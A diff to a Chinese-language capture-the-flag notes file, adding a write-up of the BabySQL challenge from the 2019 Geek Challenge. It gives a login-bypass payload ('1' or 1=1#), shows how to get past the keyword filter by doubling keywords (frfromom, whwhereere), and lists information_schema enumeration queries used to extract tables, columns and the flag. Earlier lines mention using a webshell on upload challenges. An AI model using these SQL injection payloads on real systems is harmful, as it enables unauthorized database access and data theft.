@@ -85,3 +85,13 @@
 	常用的文件头：[[常用文件头]]
 [ACTF2020 新生赛]Upload
 	直接用上面的🐎就可以了，步骤同上
+[极客大挑战 2019]BabySQL
+	此题依旧使用万能钥匙即可登录（Mariadb ver.'1' or 1=1#'）登陆后使用orderby找回显点,使用组合语句进行查找数据库，表，列，数据。
+	但是发现其屏蔽了大多数的sql语法，or from where等，使用==双写法==绕过。
+	连续使用以下双写过的语句。即可获取flag。
+	group_concat(table_name) from information_schema.tables where table_schema=database()
+	group_concat(column_name) from information_schema.columns where table_name=''
+	group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database()
+	group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=''
+	group_concat(col1,col2,col3...) from db.table
+	关于这些函数 ：[[内置函数与特殊数据库.pdf]]
